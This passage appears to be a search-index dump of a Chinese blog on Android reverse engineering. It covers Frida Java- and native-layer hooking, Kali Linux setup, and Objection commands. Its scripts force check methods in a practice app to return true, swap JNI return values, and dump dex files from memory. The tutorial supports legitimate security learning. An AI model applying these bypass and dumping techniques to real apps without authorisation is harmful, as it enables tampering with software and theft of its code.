gson.$new().toJson(x), result) return result } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:6:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"枚举(ClassLoaders) 准备一个测试App. frida_example_1.1.apk 查看相关代码 Hook frida_example_1.1.js function fifth() { Java.perform(function () { Java.choose(\"com.example.androiddemo.Activity.FridaActivity5\", { onMatch: function (instance) { console.log(\"found instance getDynamicDexCheck\", instance.getDynamicDexCheck().$className) }, onComplete: function () { console.log(\"search Complete\") } }) Java.enumerateClassLoaders({ onMatch: function (loader) { try { if (loader.findClass(\"com.example.androiddemo.Dynamic.DynamicCheck\")) { console.log(\"Succefully found loader!\", loader); Java.classFactory.loader = loader; } } catch (error) { console.log(\"found error \" + error) } }, onComplete: function () { console.log(\"enum completed!\") } }) Java.use(\"com.example.androiddemo.Dynamic.DynamicCheck\").check.implementation = function () { return true }; }) } function sixth() { Java.perform(function () { Java.use(\"com.example.androiddemo.Activity.Frida6.Frida6Class0\").check.implementation = function () { return true }; Java.use(\"com.example.androiddemo.Activity.Frida6.Frida6Class1\").check.implementation = function () { return true }; Java.use(\"com.example.androiddemo.Activity.Frida6.Frida6Class2\").check.implementation = function () { return true }; }) } function sixth2() { Java.perform(function () { Java.enumerateLoadedClasses({ onMatch: function (name, handle) { if (name.toString().indexOf(\"com.example.androiddemo.Activity.Frida6.Frida6\") \u003e= 0) { console.log(\"name\", name) Java.use(name).check.implementation = function () { return true } } }, onComplete: function () { console.log(\"enum Complete\") } }) }) } setImmediate(sixth2) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:6:4","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Frida-Native层Hook ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:0:0","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"概述 //在Frida脚本中实现native层Hook的API函数是Interceptor.attach(addr, callbacks) Interceptor.attach(addr, { onEnter(args) { //在函数调用前产生的回调,在这个函数中可以处理函数参数的相关内容. //被Hook的函数参数内容是以数组的方式存储在args中. }, onLeave(retval) { //在被Hook的目标函数执行完成后执行的函数. //被Hook的函数返回值用retval变量来表示. } }); 要实现对一个native层函数的Hook,最重要的就是找到该函数的首地址. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:1:0","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Native层函数导出 如果是导出函数,可以通过下述API函数获得相应函数的首地址. //当第一个参数为null时,会在内存加载的所有模块中搜索导出符号名. //未找到相应的导出符号名时,会抛出一个异常. Module.getExportByName(moduleName | null, exportName) //未找到相应的导出符号名时,会直接返回一个null值. Module.findExportByName(moduleName | null, exportName) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:2:0","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"准备一个测试apk java代码 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); while (true){ try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Log.d(\"LuoHun\", stringFromJNI()); } } public native String stringFromJNI(); } native代码 //libluonative.so #include \u003cjni.h\u003e#include \u003cstring\u003e //JNI函数的命名规则:Java_PackageName_ClassName_MethodName extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:2:1","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Hook示例 本例以Hook libluonative.so库中的Java_com_example_luonative_MainActivity_stringFromJNI函数为例. function hook_native() { var addr = Module.getExportByName(\"libluonative.so\", \"Java_com_example_luonative_MainActivity_stringFromJNI\") Interceptor.attach(addr, { onEnter: function (args) { console.log(\"jnienv pointer =\u003e \", args[0]) console.log(\"jobj pointer =\u003e \", args[1]) }, onLeave: function (retval) { //获取当前线程的JNIEnv结构 var env = Java.vm.getEnv() //打印日志 console.log(\"retval is =\u003e \", env.getStringUtfChars(retval, 0).readCString()) //构造一个新字符串 var jstrings = env.newStringUtf(\"Hello XiaLuoHun\"); //替换返回值 retval.replace(jstrings); } }) } function main() { hook_native() } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:2:2","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Native层函数未导出 在每次App重新运行后native函数加载的绝对地址是会变化的,唯一不变的是函数相对于所在模块基地址的偏移,因此我们可以在获取模块的基地址后加上固定的偏移地址获取相应函数的地址.Frida通过以下API来获取函数的绝对地址. //获取对应模块的基地址 Module.findBaseAddress(name) Module.getBaseAddress(name) //传入固定的偏移offset,获取最后的函数绝对地址 add(offset) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:3:0","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"动态注册的函数 为了介绍上述获取函数地址的方式,下面先介绍一下动态注册的JNI函数. 静态注册的JNI函数:可以通过一定的命名方式从Java层找到对应native层函数名. 动态注册的JNI函数:在native层实现的函数名称不定,并且不一定要求相应函数是导出类型. 只需调用以下API函数就可以完成动态注册. jint RegisterNatives(jclass clazz, const JNINativeMethod* methods,jint nMethods) //第一个参数clazz, native函数所在的类,可通过FindClass这个JNI函数获取(将类名的\".\"符号换成\"/\") //第二个参数methods, 是一个数组,其中包含函数的一些签名信息以及对应在native层的函数指针 //第三个参数nMethods, 是methods数组的数量 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:3:1","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"准备一个测试apk java代码 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); while (true){ try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Log.d(\"LuoHun\", stringFromJNI()); } } public native String stringFromJNI(); } native代码 //libluonative.so #include \u003cjni.h\u003e#include \u003cstring\u003e jstring JNICALL LuoDynamicNative( JNIEnv* env, jobject /* this */){ std::string hello = \"Hello from C++ LuoHun\"; return env-\u003eNewStringUTF(hello.c_str()); } JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved){ JNIEnv* env; vm-\u003eGetEnv((void**)\u0026env, JNI_VERSION_1_6); JNINativeMethod methods[] = { \"stringFromJNI\", \"()Ljava/lang/String;\", (void*)LuoDynamicNative }; env-\u003eRegisterNatives(env-\u003eFindClass(\"com/example/luonative/MainActivity\"), methods, 1); return JNI_VERSION_1_6; } ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:3:2","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Hook示例 上述apk编译运行后,使用Objection遍历libluonative.so模块的导出函数,会发现再也找不到stringFromJNI()字符串相关的函数了.此时就可以通过先找模块基址,再根据偏移获取函数绝对地址.那么函数的偏移如何获取呢? 通过Hook实现动态注册的函数RegisterNatives()来获取动态注册后的LuoDynamicNative()函数地址. 这里介绍一个项目frida_hook_libart,其仓库地址为https://github.com/lasting-yang/frida_hook_libart.这个项目中包含着对一些JNI函数和art相关函数的Frida Hook脚本,这里要使用的Hook脚本是hook_RegisterNatives.js 在本案例中,RegisterNatives()函数是在JNI_OnLoad()函数中完成的,即模块一加载就会自动运行的函数,因此为了能够顺利地在RegisterNatives()函数未被调用前Hook到,就需要使用Frida在注入时,选择spwan模式运行. 从上图中可以看到LuoDynamicNative()函数相对于libluonative.so模块的偏移为0xf11c Hook动态注册的LuoDynamicNative()函数的脚本如下: function hook_native() { var libluonative_addr = Module.findBaseAddress(\"libluonative.so\") console.log(\"libluonative_addr is =\u003e \", libluonative_addr) var stringFromJNI = libluonative_addr.add(0xf11c) console.log(\"stringFromJNI address is =\u003e \", stringFromJNI) Interceptor.attach(stringFromJNI, { onEnter: function (args) { console.log(\"jnienv pointer =\u003e \", args[0]) console.log(\"jobj pointer =\u003e \", args[1]) }, onLeave: function (retval) { //获取当前线程的JNIEnv结构 var env = Java.vm.getEnv() //打印日志 console.log(\"retval is =\u003e \", env.getStringUtfChars(retval, 0).readCString()) //构造一个新字符串 var jstrings = env.newStringUtf(\"Hello XiaLuoHun\"); //替换返回值 retval.replace(jstrings); } }) } function main() { hook_native() } setImmediate(main) 需要注意的是,虽然每次重新运行App时,函数的偏移地址是不会改变的,但是这是建立在App未被重新编译的基础上.如果在一次运行后App代码发生修改,并重新在AndroidStudio中编译运行,那么新的App函数的偏移地址是会发生改变的,此时应重新使用hook_RegisterNatives.js脚本获取相应函数的新偏移值并修改Hook脚本,然后再进行注入. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-native%E5%B1%82hook/:3:3","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida-native%E5%B1%82hook/"},{"categories":["环境搭建"],"content":"Kali配置 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:0:0","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"基础环境 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:0","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"下载链接 https://www.kali.org/get-kali/#kali-virtual-machines ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:1","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"以root用户登录 Kali Linux虚拟机官方提供了一个默认账号:kali/kali,但是并没有提供root账号. 先用kali/kali进入虚拟机,执行以下命令设置root账号密码. sudo passwd root 重置完root密码后,切换用户或重启系统,用刚设置的密码登录root账号. ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:2","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"设置时区 dpkg-reconfigure tzdata 在弹出窗口选择 Asia-\u003eshanghai ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:3","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"字体安装 在/usr/share/fonts目录下,创建一个文件夹my_fonts 将ttf格式字体复制到/usr/share/fonts/my_fonts目录下. ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:4","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"Shell查看和切换 查看存在的shell cat /etc/shells 查看当前使用的Shell echo $SHELL 切换Shell //这里我们要切换到bash,目前Kali默认是zsh //切换bash chsh -s /bin/bash //切换zsh chsh -s /bin/zsh 注意:重启后生效. ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:5","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"实用工具 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:0","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"ProxyChains apt install proxychains gedit /etc/proxychains.conf //找到[ProxyList]删除原来的socks4,然后加上 [socks5 IP 端口] 注意:要关闭Windows的防火墙. ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:1","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"pyenv Python版本管理软件. 安装 配置构建环境. https://github.com/pyenv/pyenv/wiki#suggested-build-environment sudo apt-get update; sudo apt-get install make build-essential libssl-dev zlib1g-dev \\ libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \\ libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev 安装pyenv. https://github.com/pyenv/pyenv#basic-github-checkout proxychains git clone https://github.com/yyuu/pyenv.git ~/.pyenv //zsh echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' \u003e\u003e~/.zshrc echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' \u003e\u003e~/.zshrc echo -e 'if command -v pyenv 1\u003e/dev/null 2\u003e\u00261; then\\n eval \"$(pyenv init --path)\"\\nfi'\u003e\u003e~/.zshrc //bash echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' \u003e\u003e~/.bashrc echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' \u003e\u003e~/.bashrc echo -e 'if command -v pyenv 1\u003e/dev/null 2\u003e\u00261; then\\n eval \"$(pyenv init --path)\"\\nfi'\u003e\u003e~/.bashrc 安装python版本. //无代理 pyenv install 3.8.0 //有代理 PYTHON_CONFIGURE_OPTS=\"--disable-ipv6\" proxychains pyenv install 3.8.0 常用命令 //列出可供安装的python版本 pyenv install --list //安装指定版本的 pyenv install \u003cversion\u003e //在当前目录下设置python版本 pyenv local \u003cversion\u003e //全局设置python版本 pyenv global \u003cversion\u003e //列出系统中安装的python版本 pyenv versions //显示当前目录下采用的python pyenv version 参考链接 https://www.jianshu.com/p/be08b5b1dbf6/ https://www.jianshu.com/p/7656896265ab ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:2","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"htop 加强版的top工具,可以动态查看当前活跃的、系统占用率高的进程. apt install htop ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:3","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"jnettop 用来实时查看系统网络负载. apt install jnettop ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:4","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"tree 文件名搜索工具,在解包apk后,搜索文件的名字非常好用. apt install tree ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:5","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"编程工具 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:0","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"AndroidStudio 下载AndroidStudio https://developer.android.google.cn/studio 解压并运行. 切换到android-studio/bin目录下,运行当前目录的studio.sh即可启动AndroidStudio. 创建程序桌面图标. //创建桌面图标 vim /usr/share/applications/android-studio.desktop //添加以下内容 [Desktop Entry] Name=AndroidStudio Encoding=UTF-8 Exec=sh -c \"/software/android-studio/bin/studio.sh\" Icon=/software/android-studio/bin/studio.png StartupNotify=false Terminal=false Type=Application 执行完上述操作后,即可在菜单中找到AndroidStudio的桌面程序图标,右键可以添加到桌面.其它应用程序雷同. 将adb工具添加到环境变量. 默认安装的话,adb所在目录为/root/Android/Sdk/platform-tools echo \"export PATH=$PATH:/root/Android/Sdk/platform-tools\" \u003e\u003e ~/.zshrc source ~/.zshrc ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:1","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"VSCode https://code.visualstudio.com/ dpkg -i [.deb文件的名字] 以root用户启动VSCode,无法启动问题解决: //修改Command为 /usr/share/code/code --no-sandbox --unity-launch %F ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:2","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["Android Hook"],"content":"Objection使用 Frida只是提供了各种API供我们调用,在此基础上可以实现具体的功能,有大佬将各种常见的、常用的功能整合进一个工具,供我们在命令行中使用,这个工具就是Objection. ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:0:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"安装 由于Objection是基于Frida的,所以我们要安装与Frida发布日期相近的版本. https://pypi.org/project/objection/#history #pip install frida==14.2.13 #pip install frida-tools==9.2.1 #下载指定版本的objection pip install objection==1.11.0 ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:1:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"连接非标准端口 #objection -N -h 192.168.2.111 -p 6666 -g com.android.settings explore objection -N -h 手机的ip -p frida监听的端口 -g 安卓应用 explore ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:2:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"内存漫游相关命令 ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"查看内存加载的库 memory list modules ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"查看库的导出函数 memory list exports libssl.so #写文件 memory list exports libssl.so --json tst.json ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"列出内存中所有类 android hooking list classes ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:3","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"内存中搜索所有的类 在内存中所有已加载的类中搜索包含特定关键词的类. #搜索包含display关键词的类 android hooking search classes display ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:4","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"内存中搜索所有的方法 在内存中所有已加载的类的方法中搜索包含特定关键词的方法. #搜索包含display关键词的方法 android hooking search methods display ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:5","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"列出类的所有方法 当搜索到了比较关心的类之后,就可以直接查看它有哪些方法. android hooking list class_methods com.android.settings.DisplaySettings ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:6","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"列出进程所有的activity android hooking list activities ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:7","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"启动activity android intent launch_activity com.android.settings.DisplaySettings ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:8","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"列出进程所有的service android hooking list services ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:9","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"启动service android intent launch_service com.android.settings.bluetooth.BluetoothPairingService ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:3:10","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"Hook相关命令 上述操作均是基于在内存中直接枚举搜索,已经可以获取到大量有用的静态信息,我们再来介绍几个方法,可以获取到执行时动态的信息. 在以下命令中加上–dump-args –dump-return –dump-backtrace三个参数,分别用于打印函数的参数、返回值、以及调用栈. ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:4:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"对指定方法进行Hook 比如想看getName()方法,则运行以下命令: #android hooking watch class_method java.io.File.$init --dump-args android hooking watch class_method android.bluetooth.BluetoothDevice.getName --dump-args --dump-return --dump-backtrace ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:4:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"hook类的所有方法 android hooking watch class android.bluetooth.BluetoothDevice ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:4:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"Jobs命令 #可以看到objection为我们创建的Hooks数 jobs list #删除作业 jobs kill \u003cid\u003e ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:4:3","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"主动调用 ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:5:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"在堆上搜索实例 android heap search instances com.android.settings.DisplaySettings ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:5:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"调用实例的方法 无参调用 查看源码得知com.android.settings.DisplaySettings类有getPreferenceScreenResId()方法. #无参调用 #android heap execute \u003chandle\u003e \u003cmethodname\u003e android heap execute 0x225a getPreferenceScreenResId 有参调用 android heap evaluate \u003chandle\u003e 在进入一个迷你编辑器环境后,输入想要执行的脚本内容,确认编辑完成,然后按Esc键退出编辑,最后按回车键,即会开始执行这行脚本并输出结果.这里的脚本内容和在编辑器中直接编写的脚本内容是一样的. heap evaluate既可以执行有参函数,也可以执行无参函数. ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:5:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"插件 ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:6:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"Wallbreaker https://github.com/hluwa/Wallbreaker #加载插件 plugin load C:/Users/XiaLuoHun/Desktop/Wallbreaker-1.0.2 #查看类信息 plugin wallbreaker classdump --fullname android.bluetooth.BluetoothDevice #寻找类的实例对象并查看 plugin wallbreaker objectsearch android.bluetooth.BluetoothDevice #[xxx] plugin wallbreaker objectdump xxx ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:6:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"DexDump https://github.com/hluwa/FRIDA-DEXDump #加载插件 plugin load C:/Users/Xia/Desktop/FRIDA-DEXDump-1.0.3/frida_dexdump #Dump plugin dexdump search plugin dexdump dump ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:6:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Hook"],"content":"参考链接 https://www.anquanke.com/post/id/197657#3-7 实用FRIDA进阶.pdf ","date":"2021-11-25","objectID":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/:7:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android基础"],"content":"Android逆向常用命令 